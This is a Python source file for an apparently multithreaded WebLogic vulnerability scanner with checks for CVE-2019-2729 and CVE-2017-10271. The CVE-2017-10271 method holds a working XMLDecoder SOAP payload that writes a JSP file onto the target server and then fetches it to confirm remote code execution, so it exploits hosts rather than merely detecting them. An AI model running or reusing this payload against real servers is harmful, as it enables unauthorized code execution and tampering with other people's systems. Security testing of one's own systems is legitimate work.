import requests
import threading
from termcolor import cprint
from urllib.parse import urlparse

class Detect(threading.Thread):
    def __init__(self, alive_Web_queue, vul_list):
        threading.Thread.__init__(self)
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'}
        self.alive_Web_queue = alive_Web_queue      # 存活web的队列
        self.vul_list = vul_list                    # 存储漏洞的名字和url


    def run(self):
        while not self.alive_Web_queue.empty():
            alive_web = self.alive_Web_queue.get()
            self.run_detect(alive_web)

    def CVE_2019_2729(self,url):
        weblogic_url = url + '/_async/AsyncResponseService'
        try:
            res = requests.get(url=weblogic_url, headers=self.headers, allow_redirects=False, timeout=10)
            if 'AsyncResponseService home page' in res.text:
                cprint('[CVE-2019-2719 {}'.format(url), 'red')
                self.vul_list.append(['weblogic', url])
            else:
                print('[-] {}'.format(url))
        except Exception as e:
            pass

    def CVE_2017_10271(self, url):
        headers = {"Content-Type": "text/xml"}
        exp = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java><java version="1.4.0" class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter">
                <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a1.jsp</string><void method="println">
                <string><![CDATA[111111111111111111111111111111111]]></string></void><void method="close"/>
            </object>
        </java>
      </java>
    </work:WorkContext>
  </soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
        '''
        try:
            tgtURL = url + '/wls-wsat/CoordinatorPortType'
            requests.post(tgtURL, data=exp, headers=headers, timeout=10)
            jsp_path = url + '/bea_wls_internal/a1.jsp'
            text = requests.get(jsp_path, headers=headers, timeout=10).text
            if "111111111111111111111111111111111" in text:
                cprint("[CVE-2017-10271] {} WebLogic WLS xmldecoder RCE ! path : {}".format(url, jsp_path), 'red')
            else:
                print('[-] {}'.format(url))
        except Exception as e:
            pass

    def run_detect(self, url):
        if not urlparse(url).scheme:
            url = 'https://' + url
        else:
            url = url
        self.CVE_2019_2729(url)
